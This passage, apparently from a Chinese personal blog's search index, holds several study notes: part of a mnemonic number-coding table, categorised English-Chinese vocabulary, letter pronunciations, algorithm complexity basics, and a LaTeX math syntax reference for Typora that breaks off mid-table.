align="center">靶儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/82靶儿.png"></td></tr><tr><td align="center">83</td><td align="center">谐音</td><td align="center">芭蕉扇</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/83芭蕉扇.png"></td></tr><tr><td align="center">84</td><td align="center">谐音</td><td align="center">巴士</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/84巴士.png"></td></tr><tr><td align="center">85</td><td align="center">谐音</td><td align="center">宝物</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/85宝物.png"></td></tr><tr><td align="center">86</td><td align="center">谐音</td><td align="center">八路军</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/86八路.png"></td></tr><tr><td align="center">87</td><td align="center">谐音</td><td align="center">白棋</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/87白棋.png"></td></tr><tr><td align="center">88</td><td align="center">谐音</td><td align="center">爸爸</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/88爸爸.png"></td></tr><tr><td align="center">89</td><td align="center">谐音</td><td align="center">芭蕉</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/89芭蕉.png"></td></tr><tr><td align="center">90</td><td align="center">谐音</td><td align="center">精灵</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/90精灵.png"></td></tr><tr><td align="center">91</td><td align="center">谐音</td><td align="center">球衣</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/91球衣.png"></td></tr><tr><td align="center">92</td><td align="center">谐音</td><td align="center">球儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/92球儿.png"></td></tr><tr><td align="center">93</td><td align="center">谐音</td><td align="center">旧伞</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/93旧伞.png"></td></tr><tr><td align="center">94</td><td align="center">谐音</td><td align="center">教师</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/94教师.png"></td></tr><tr><td align="center">95</td><td align="center">谐音</td><td align="center">酒壶</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/95酒壶.png"></td></tr><tr><td align="center">96</td><td align="center">谐音</td><td align="center">酒楼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/96酒楼.png"></td></tr><tr><td align="center">97</td><td align="center">谐音</td><td align="center">旧旗</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/97旧旗.png"></td></tr><tr><td align="center">98</td><td align="center">谐音</td><td align="center">酒吧</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/98酒吧.png"></td></tr><tr><td align="center">99</td><td align="center">谐音</td><td align="center">舅舅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/99舅舅.png"></td></tr><tr><td align="center">0</td><td align="center">形状</td><td align="center">呼啦圈</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/0呼啦圈.png"></td></tr><tr><td align="center">1</td><td align="center">形状</td><td align="center">蜡烛</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/1蜡烛.png"></td></tr><tr><td align="center">2</td><td align="center">形状</td><td align="center">鹅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/2鹅.png"></td></tr><tr><td align="center">3</td><td align="center">形状</td><td align="center">耳朵</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/3耳朵.png"></td></tr><tr><td align="center">4</td><td align="center">形状</td><td align="center">帆船</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/4帆船.png"></td></tr><tr><td align="center">5</td><td align="center">形状</td><td align="center">秤钩</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/5称钩.png"></td></tr><tr><td align="center">6</td><td align="center">形状</td><td align="center">勺子</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/6勺子.png"></td></tr><tr><td align="center">7</td><td align="center">形状</td><td align="center">镰刀</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/7镰刀.png"></td></tr><tr><td align="center">8</td><td align="center">形状</td><td align="center">眼镜</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/8眼镜.png"></td></tr><tr><td align="center">9</td><td align="center">形状</td><td align="center">口哨</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/9哨子.png"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码系统 </tag>
            
            <tag> 数字编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语词汇分类汇总</title>
      <link href="/2020/09/02/ying-yu-ci-hui-fen-lei-hui-zong/"/>
      <url>/2020/09/02/ying-yu-ci-hui-fen-lei-hui-zong/</url>
      
        <content type="html"><![CDATA[<center><font size="100">英语词汇分类汇总</font></center><h1 id="专业课程"><a href="#专业课程" class="headerlink" title="专业课程"></a>专业课程</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center">Arts</td><td align="center">文科</td></tr><tr><td align="center">Science</td><td align="center">理科</td></tr><tr><td align="center">Agriculture</td><td align="center">农业学</td></tr><tr><td align="center">Architecture</td><td align="center">建筑学</td></tr><tr><td align="center">Chemistry</td><td align="center">化学</td></tr><tr><td align="center">Astronomy</td><td align="center">天文学</td></tr><tr><td align="center">Biology</td><td align="center">生物学</td></tr><tr><td align="center">Economics</td><td align="center">经济学</td></tr><tr><td align="center">Engineering</td><td align="center">工程学</td></tr><tr><td align="center">Finance</td><td align="center">金融学</td></tr><tr><td align="center">Geography</td><td align="center">地理学</td></tr><tr><td align="center">Geology</td><td align="center">地质学</td></tr><tr><td align="center">Literature</td><td align="center">文学</td></tr><tr><td align="center">Medicine</td><td align="center">医学</td></tr><tr><td align="center">Mining</td><td align="center">采矿学</td></tr><tr><td align="center">Philosophy</td><td align="center">哲学</td></tr><tr><td align="center">Physics</td><td align="center">物理学</td></tr><tr><td align="center">Politics</td><td align="center">物理学</td></tr><tr><td align="center">Politics</td><td align="center">政治学</td></tr><tr><td align="center">Psychology</td><td align="center">心理学</td></tr><tr><td align="center">Sociology</td><td align="center">社会学</td></tr><tr><td align="center">Mechanics</td><td align="center">机械学</td></tr><tr><td align="center">Public Relations</td><td align="center">公共关系学</td></tr><tr><td align="center">major</td><td align="center">主修（课）</td></tr><tr><td align="center">minor</td><td align="center">辅修（课）</td></tr><tr><td align="center">specialized course</td><td align="center">专业课</td></tr><tr><td align="center">selective/optional course</td><td align="center">选修课</td></tr><tr><td align="center">required course</td><td align="center">必修课</td></tr><tr><td align="center">curriculum</td><td align="center">课程</td></tr></tbody></table><h1 id="性格态度"><a href="#性格态度" class="headerlink" title="性格态度"></a>性格态度</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center">active</td><td align="center">活跃的</td></tr><tr><td align="center">extrovert</td><td align="center">外向的</td></tr><tr><td align="center">energetic</td><td align="center">精力充沛的</td></tr><tr><td align="center">introvert</td><td align="center">内向的</td></tr><tr><td align="center">humorous</td><td align="center">幽默的</td></tr><tr><td align="center">amiable</td><td align="center">和蔼可亲的</td></tr><tr><td align="center">agreeable</td><td align="center">令人愉快的</td></tr><tr><td align="center">impulsive</td><td align="center">冲动的</td></tr><tr><td align="center">strict</td><td align="center">一丝不苟的</td></tr><tr><td align="center">frank</td><td align="center">坦率的</td></tr><tr><td align="center">careful</td><td align="center">办事仔细的</td></tr><tr><td align="center">demanding</td><td align="center">要求严格的</td></tr><tr><td align="center">honest</td><td align="center">诚实的</td></tr><tr><td align="center">decisive</td><td align="center">果断的</td></tr><tr><td align="center">capable</td><td align="center">有能力的</td></tr><tr><td align="center">upright</td><td align="center">正直的</td></tr><tr><td align="center">sociable</td><td align="center">好交际的</td></tr><tr><td align="center">reliable</td><td align="center">可靠的</td></tr><tr><td align="center">generous</td><td align="center">宽容的</td></tr><tr><td align="center">serious</td><td align="center">严肃的</td></tr><tr><td align="center">intelligent</td><td align="center">聪明的</td></tr><tr><td align="center">independent</td><td align="center">独立的</td></tr><tr><td align="center">relaxed</td><td align="center">放松的</td></tr><tr><td align="center">efficient</td><td align="center">有效率的</td></tr><tr><td align="center">faithful</td><td align="center">忠诚的</td></tr><tr><td align="center">steady</td><td align="center">稳健的</td></tr><tr><td align="center">competent</td><td align="center">能干的</td></tr><tr><td align="center">responsible</td><td align="center">有责任心的</td></tr><tr><td align="center">industrious</td><td align="center">勤奋的</td></tr><tr><td align="center">adaptable</td><td align="center">适应性强的</td></tr><tr><td align="center">calm</td><td align="center">冷静的</td></tr><tr><td align="center">accurate</td><td align="center">精确的</td></tr><tr><td align="center">analytical</td><td align="center">头脑缜密的</td></tr><tr><td align="center">genteel</td><td align="center">有教养的</td></tr><tr><td align="center">devoted</td><td align="center">专心致志的</td></tr><tr><td align="center">creative</td><td align="center">富有创造力的</td></tr><tr><td align="center">courteous</td><td align="center">有礼貌的</td></tr><tr><td align="center">dedicated</td><td align="center">专注的</td></tr></tbody></table><h1 id="业余爱好"><a href="#业余爱好" class="headerlink" title="业余爱好"></a>业余爱好</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center">ball game</td><td align="center">球类运动</td></tr><tr><td align="center">tennis</td><td align="center">网球</td></tr><tr><td align="center">basketball</td><td align="center">篮球</td></tr><tr><td align="center">volleyball</td><td align="center">排球</td></tr><tr><td align="center">baseball</td><td align="center">棒球</td></tr><tr><td align="center">table-tennis</td><td align="center">乒乓球</td></tr><tr><td align="center">badminton</td><td align="center">羽毛球</td></tr><tr><td align="center">football</td><td align="center">足球</td></tr><tr><td align="center">swimming</td><td align="center">游泳</td></tr><tr><td align="center">climbing</td><td align="center">登山</td></tr><tr><td align="center">hiking</td><td align="center">远足</td></tr><tr><td align="center">camping</td><td align="center">野营</td></tr><tr><td align="center">music</td><td align="center">音乐</td></tr><tr><td align="center">novel</td><td align="center">小说</td></tr><tr><td align="center">guitar</td><td align="center">吉他</td></tr><tr><td align="center">piano</td><td align="center">钢琴</td></tr><tr><td align="center">chess</td><td align="center">象棋</td></tr><tr><td align="center">sketching</td><td align="center">素描</td></tr><tr><td align="center">calligraphy</td><td align="center">书法</td></tr><tr><td align="center">traveling</td><td align="center">旅游</td></tr><tr><td align="center">singing</td><td align="center">唱歌</td></tr><tr><td align="center">body-building</td><td align="center">健身</td></tr><tr><td align="center">stamp/coin collection</td><td align="center">集邮/收集硬币</td></tr></tbody></table><h1 id="经典书籍"><a href="#经典书籍" class="headerlink" title="经典书籍"></a>经典书籍</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center"><em>The Spring and Autumn Annals</em></td><td align="center">《春秋》</td></tr><tr><td align="center"><em>Historical Records</em></td><td align="center">《史记》</td></tr><tr><td align="center"><em>The Book of Songs</em></td><td align="center">《诗经》</td></tr><tr><td align="center"><em>The Book of History</em></td><td align="center">《书经》</td></tr><tr><td align="center"><em>The Book of Changes</em></td><td align="center">《易经》</td></tr><tr><td align="center"><em>The Four Books</em></td><td align="center">四书</td></tr><tr><td align="center"><em>The Five Classics</em></td><td align="center">五经</td></tr><tr><td align="center"><em>The Book of Rites</em></td><td align="center">《礼记》</td></tr><tr><td align="center"><em>The Great Learning</em></td><td align="center">《大学》</td></tr><tr><td align="center"><em>The Doctrine of the Mean</em></td><td align="center">《中庸》</td></tr><tr><td align="center"><em>The Analects of Confucius</em></td><td align="center">《论语》</td></tr><tr><td align="center"><em>The Mencius</em></td><td align="center">《孟子》</td></tr><tr><td align="center"><em>The Classic of Mountains and Rivers</em></td><td align="center">《山海经》</td></tr><tr><td align="center"><em>Compendium of Materia Medica</em></td><td align="center">《本草纲目》</td></tr><tr><td align="center"><em>History as a Mirror</em></td><td align="center">《资治通鉴》</td></tr><tr><td align="center"><em>The Romance of West Chamber</em></td><td align="center">《西厢记》</td></tr><tr><td align="center"><em>Red Star Over China</em></td><td align="center">《西行漫记》</td></tr><tr><td align="center"><em>The Romance of the Three Kingdoms</em></td><td align="center">《三国演义》</td></tr><tr><td align="center"><em>Water Margin</em></td><td align="center">《水浒传》</td></tr><tr><td align="center"><em>Journey to the West;Pilgrimage to the West</em></td><td align="center">《西游记》</td></tr><tr><td align="center"><em>A Dream in Red Mansions;The Story of the Stone</em></td><td align="center">《红楼梦》</td></tr><tr><td align="center"><em>Strange Tales of a Lonely Studio</em></td><td align="center">《聊斋志异》</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语单词 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>26个字母音标表</title>
      <link href="/2020/09/02/26-ge-zi-mu-yin-biao-biao/"/>
      <url>/2020/09/02/26-ge-zi-mu-yin-biao-biao/</url>
      
        <content type="html"><![CDATA[<p>26个字母音标表</p><table><thead><tr><th align="center">大写</th><th align="center">小写</th><th align="center">音标</th></tr></thead><tbody><tr><td align="center"><code>A</code></td><td align="center"><code>a</code></td><td align="center"><code>[ei]</code></td></tr><tr><td align="center"><code>B</code></td><td align="center"><code>b</code></td><td align="center"><code>[bi:]</code></td></tr><tr><td align="center"><code>C</code></td><td align="center"><code>c</code></td><td align="center"><code>[si:]</code></td></tr><tr><td align="center"><code>D</code></td><td align="center"><code>d</code></td><td align="center"><code>[di:]</code></td></tr><tr><td align="center"><code>E</code></td><td align="center"><code>e</code></td><td align="center"><code>[i:]</code></td></tr><tr><td align="center"><code>F</code></td><td align="center"><code>f</code></td><td align="center"><code>[ef]</code></td></tr><tr><td align="center"><code>G</code></td><td align="center"><code>g</code></td><td align="center"><code>[dʒi:]</code></td></tr><tr><td align="center"><code>H</code></td><td align="center"><code>h</code></td><td align="center"><code>[eit∫]</code></td></tr><tr><td align="center"><code>I</code></td><td align="center"><code>i</code></td><td align="center"><code>[ai]</code></td></tr><tr><td align="center"><code>J</code></td><td align="center"><code>j</code></td><td align="center"><code>[dʒei]</code></td></tr><tr><td align="center"><code>K</code></td><td align="center"><code>k</code></td><td align="center"><code>[kei]</code></td></tr><tr><td align="center"><code>L</code></td><td align="center"><code>l</code></td><td align="center"><code>[el]</code></td></tr><tr><td align="center"><code>M</code></td><td align="center"><code>m</code></td><td align="center"><code>[em]</code></td></tr><tr><td align="center"><code>N</code></td><td align="center"><code>n</code></td><td align="center"><code>[en]</code></td></tr><tr><td align="center"><code>O</code></td><td align="center"><code>o</code></td><td align="center"><code>[əu]</code></td></tr><tr><td align="center"><code>P</code></td><td align="center"><code>p</code></td><td align="center"><code>[pi:]</code></td></tr><tr><td align="center"><code>Q</code></td><td align="center"><code>q</code></td><td align="center"><code>[kju:]</code></td></tr><tr><td align="center"><code>R</code></td><td align="center"><code>r</code></td><td align="center"><code>[ɑ:]</code></td></tr><tr><td align="center"><code>S</code></td><td align="center"><code>s</code></td><td align="center"><code>[es]</code></td></tr><tr><td align="center"><code>T</code></td><td align="center"><code>t</code></td><td align="center"><code>[ti:]</code></td></tr><tr><td align="center"><code>U</code></td><td align="center"><code>u</code></td><td align="center"><code>[ju:]</code></td></tr><tr><td align="center"><code>V</code></td><td align="center"><code>v</code></td><td align="center"><code>[vi:]</code></td></tr><tr><td align="center"><code>W</code></td><td align="center"><code>w</code></td><td align="center"><code>[′d∧blju:]</code></td></tr><tr><td align="center"><code>X</code></td><td align="center"><code>x</code></td><td align="center"><code>[eks]</code></td></tr><tr><td align="center"><code>Y</code></td><td align="center"><code>y</code></td><td align="center"><code>[wai]</code></td></tr><tr><td align="center"><code>Z</code></td><td align="center"><code>z</code></td><td align="center"><code>[zi:]</code>,<code>[zed]</code></td></tr></tbody></table><p><a href="https://en-yinbiao.xiao84.com/yinbiaofayin/" target="_blank" rel="noopener">巴士英语网-48个国际音标</a></p><p><a href="http://www.gaosan.com/gaokao/244383.html" target="_blank" rel="noopener">高三网-48个英语音标正确读法</a></p><p><a href="http://yinbiao.tingclass.net/show-16-9-1.html#" target="_blank" rel="noopener">英语音标</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 速记基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法基础</title>
      <link href="/2020/09/02/suan-fa-ji-chu/"/>
      <url>/2020/09/02/suan-fa-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="算法定义"><a href="#算法定义" class="headerlink" title="算法定义"></a>算法定义</h1><p>​        算法是对特定问题求解步骤的一种描述，它不依赖于任何语言，既可以使用自然语言、程序语言等描述，也可以使用流程图、框图来表示。（个人可以根据自己的喜好来选择算法的描述方式，最常用的是一种类C伪代码）</p><h1 id="算法评价"><a href="#算法评价" class="headerlink" title="算法评价"></a>算法评价</h1><ul><li><strong>数学</strong>是皇冠上的<strong>明珠</strong>，<strong>算法</strong>是明珠上的<strong>光芒</strong>。(数学是美学，算法是艺术）</li><li><strong>数据结构</strong>是程序的<strong>骨架</strong>，<strong>算法</strong>是程序的<strong>灵魂</strong>。（数据结构+算法＝程序）</li></ul><h1 id="算法特性"><a href="#算法特性" class="headerlink" title="算法特性"></a>算法特性</h1><ul><li><strong>输入</strong>：有零个或多个输入<strong>（≥0）</strong></li><li><strong>输出</strong>：有一个或多个输出<strong>（≥1）</strong></li><li><strong>有穷性</strong>：算法是由若干条指令组成的<strong>有穷序列</strong>，总是在执行若干次后结束，不能永不停止</li><li><strong>确定性</strong>：每条语句有确定的意义，<strong>无歧义</strong></li><li><strong>可行性</strong>：算法在当前环境条件下可以通过有限次运算实现</li></ul><h1 id="算法评判标准"><a href="#算法评判标准" class="headerlink" title="算法评判标准"></a>算法评判标准</h1><ul><li><strong>正确性</strong>：正确性是指算法能够满足具体问题的需求，程序运行正常，无语法错误，能够通过典型软件测试，达到预期的需求。</li><li><strong>易读性</strong>：算法遵循标识符命名规则，简洁易懂，注释语句恰当适量，方便自己和他人阅读，便于后期调试和修改。</li><li><strong>健壮性</strong>：算法对非法数据及操作有较好的反应和处理。</li><li><strong>高效性</strong>：高效性是指算法运行效率高，即算法运行消耗的时间短。（时间复杂度）</li><li><strong>低存储性</strong>：低存储性是指算法所需的存储空间低。（空间复杂度）</li></ul><h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>​        时间复杂度T(n)：（通常使用<strong>时间复杂度渐进上界</strong><code>O(f(n))</code>来表示时间复杂度）<br>​        算法运行需要的时间，一般将算法的执行次数作为时间复杂度的度量标准。（不是每个算法都能计算运行次数-最好情况，最坏情况，等）<br><strong>常见的算法时间复杂度类型</strong>：<br>（1）<strong>常熟阶</strong>：算法运行的次数是一个常数<br>（2）<strong>多项式阶</strong>：算法运行的次数是一个多项式<br>（3）<strong>指数阶</strong>：算法运行的次数是一个指数（效率极差）<br>（4）<strong>对数阶</strong>：算法运行的次数是一个对数<br>比较：<br><code>O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n^2)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)</code></p><h1 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h1><p>​        算法占用的空间大小，一般将算法的<strong>辅助空间</strong>作为衡量算法空间复杂度的标准。<br>空间复杂度的本意是指算法在运行过程中占用的了多少存储空间，算法占用的存储空间包括：<br>（1）输入/输出数据<br>（2）算法本身所需的存储空间<br>（3）额外需要的辅助空间（是衡量算法空间复杂度的关键因素）<br>注：<br>​        递归算法中每一次递推需要一个栈空间来保存调用记录，因此，空间复杂度需要计算递归栈的辅助空间。<br>​        阶乘是典型的递归调用问题，递归包括递推和回归。递推是将原问题不断分解成子问题，直到达到结束条件，返回最近子问题的解，然后逆向逐一回归，最终达到递推开始的原问题，返回原问题的解。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Typora编辑数学表达式</title>
      <link href="/2020/09/02/zai-typora-bian-ji-shu-xue-biao-da-shi/"/>
      <url>/2020/09/02/zai-typora-bian-ji-shu-xue-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="编辑器简述"><a href="#编辑器简述" class="headerlink" title="编辑器简述"></a>编辑器简述</h1><p>​        Typora是一款免费的Markdown编辑器，其主要特点为所见即所得。Typora内嵌LaTex数学表达式语法，即在Typora中可以通过LaTex语法来编辑数学表达式。</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>​        <code>$</code>是编辑数学表达式的重要符号。被<code>$</code>包裹的语句会按LaTex语法解析成数学表达式形式展示。</p><ul><li><p>行内表达式写在<code>$...$</code>之间，行间表达式写在<code>$$...$$</code>之间</p></li><li><p>如果要在同一行输入多个公式，只需要在公式之间加上<code>\(空格)</code>或者<code>\quad</code></p></li><li><p>如果要输入多行公式，只需要在上一行公式的末尾加上<code>\\</code></p></li></ul><h2 id="公式模块打开姿势"><a href="#公式模块打开姿势" class="headerlink" title="公式模块打开姿势"></a>公式模块打开姿势</h2><ul><li><strong>点击</strong>【段落】–&gt; 【公式块】</li><li><strong>快捷键</strong>：<font color="red">Ctrl + Shift + M</font></li><li><strong>代码模式</strong>：<code>$$</code>+ 回车</li></ul><p>数学表达式编辑栏，如下所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Typora-mathx/数学表达式编辑栏.png" alt="数学表达式编辑栏"></center><h1 id="常用表达式"><a href="#常用表达式" class="headerlink" title="常用表达式"></a>常用表达式</h1><h2 id="上-下标"><a href="#上-下标" class="headerlink" title="上/下标"></a>上/下标</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$x^2$</td><td align="center"><code>$x^2$</code></td></tr><tr><td align="center">$x_2$</td><td align="center"><code>$x_2$</code></td></tr></tbody></table><h2 id="分式"><a href="#分式" class="headerlink" title="分式"></a>分式</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$1/2$</td><td align="center"><code>$1/2$</code></td></tr><tr><td align="center">$\frac{a+1}{b+2}$</td><td align="center"><code>$\frac{a+1}{b+2}$</code></td></tr><tr><td align="center">${a+1}\over{b+2}$</td><td align="center"><code>${a+1}\over{b+2}$</code></td></tr><tr><td align="center">$\frac ab$</td><td align="center"><code>$\frac ab$</code></td></tr></tbody></table><h2 id="均值"><a href="#均值" class="headerlink" title="均值"></a>均值</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\overline{x}$</td><td align="center"><code>$\overline{x}$</code></td></tr></tbody></table><h2 id="开方"><a href="#开方" class="headerlink" title="开方"></a>开方</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\sqrt{x}$</td><td align="center"><code>$\sqrt{x}$</code></td></tr><tr><td align="center">$\sqrt[n]{x}$</td><td align="center"><code>$\sqrt[n]{x}$</code></td></tr><tr><td align="center">${x}^{\frac 12}$</td><td align="center"><code>${x}^{\frac 12}$</code></td></tr></tbody></table><h2 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a>矢量</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\vec{a}$</td><td align="center"><code>$\vec{a}$</code></td></tr></tbody></table><h2 id="积分"><a href="#积分" class="headerlink" title="积分"></a>积分</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\int{x}dx$</td><td align="center"><code>$\int{x}dx$</code></td></tr><tr><td align="center">$\int_0^1{x}dx$</td><td align="center"><code>$\int_0^1{x}dx$</code></td></tr><tr><td align="center">$\iint xdx$</td><td align="center"><code>$\iint xdx$</code></td></tr><tr><td align="center">$\iiint xdx$</td><td align="center"><code>$\iiint xdx$</code></td></tr><tr><td align="center">$\idotsint xdx$</td><td align="center"><code>$\idotsint xdx$</code></td></tr></tbody></table><h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$lim n$</td><td align="center"><code>$lim n$</code></td></tr><tr><td align="center">$\lim_{n\to+\infty} n$</td><td align="center"><code>$\lim_{n\to+\infty} n$</code></td></tr></tbody></table><h2 id="累加"><a href="#累加" class="headerlink" title="累加"></a>累加</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\sum{a}$</td><td align="center"><code>$\sum{a}$</code></td></tr><tr><td align="center">$\sum_{n=1}^{100}{a_n}$</td><td align="center"><code>$\sum_{n=1}^{100}{a_n}$</code></td></tr></tbody></table><h2 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\prod x$</td><td align="center"><code>$\prod x$</code></td></tr><tr><td align="center">$\prod _{n=1} ^{100} x_n$</td><td align="center"><code>$\prod _{n=1} ^{100} x_n$</code></td></tr></tbody></table><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\sin x$</td><td align="center"><code>$\sin x$</code></td></tr><tr><td align="center">$\cos x$</td><td align="center"><code>$\cos x$</code></td></tr><tr><td align="center">$\tan x$</td><td align="center"><code>$\tan x$</code></td></tr><tr><td align="center">$\cot x$</td><td align="center"><code>$\cot x$</code></td></tr><tr><td align="center">$\sec x$</td><td align="center"><code>$\sec x$</code></td></tr><tr><td align="center">$\csc x$</td><td align="center"><code>$\csc x$</code></td></tr></tbody></table><h2 id="反三角函数"><a href="#反三角函数" class="headerlink" title="反三角函数"></a>反三角函数</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\arcsin x$</td><td align="center"><code>$\arcsin x$</code></td></tr><tr><td align="center">$\arccos x$</td><td align="center"><code>$\arccos x$</code></td></tr><tr><td align="center">$\arctan x$</td><td align="center"><code>$\arctan x$</code></td></tr></tbody></table><h2 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\ln 2$</td><td align="center"><code>$\ln 2$</code></td></tr><tr><td align="center">$\log _2{8}$</td><td align="center"><code>$\log _2{8}$</code></td></tr><tr><td align="center">$\lg8$</td><td align="center"><code>$\lg8$</code></td></tr></tbody></table><h2 id="省略号"><a href="#省略号" class="headerlink" title="省略号"></a>省略号</h2><table><thead><tr><th align="center">表达式</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\cdots$</td><td align="center"><code>$\cdots$</code></td></tr></tbody></table><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><table><thead><tr><th align="center">运算符</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\pm$</td><td align="center"><code>$\pm$</code></td></tr><tr><td align="center">$\times$</td><td align="center"><code>$\times$</code></td></tr><tr><td align="center">$\cdot$</td><td align="center"><code>$\cdot$</code></td></tr><tr><td align="center">$\div$</td><td align="center"><code>$\div$</code></td></tr><tr><td align="center">$\neq$</td><td align="center"><code>$\neq$</code></td></tr><tr><td align="center">$\equiv$</td><td align="center"><code>$\equiv$</code></td></tr><tr><td align="center">$\lt$</td><td align="center"><code>$\lt$</code></td></tr><tr><td align="center">$\gt$</td><td align="center"><code>$\gt$</code></td></tr><tr><td align="center">$\leqslant$</td><td align="center"><code>$\leqslant$</code></td></tr><tr><td align="center">$\geqslant$</td><td align="center"><code>$\geqslant$</code></td></tr><tr><td align="center">$\leq$</td><td align="center"><code>$\leq$</code></td></tr><tr><td align="center">$\geq$</td><td align="center"><code>$\geq$</code></td></tr><tr><td align="center">$\le$</td><td align="center"><code>$\le$</code></td></tr><tr><td align="center">$\ge$</td><td align="center"><code>$\ge$</code></td></tr><tr><td align="center">$\leqq$</td><td align="center"><code>$\leqq$</code></td></tr><tr><td align="center">$\geqq$</td><td align="center"><code>$\geqq$</code></td></tr><tr><td 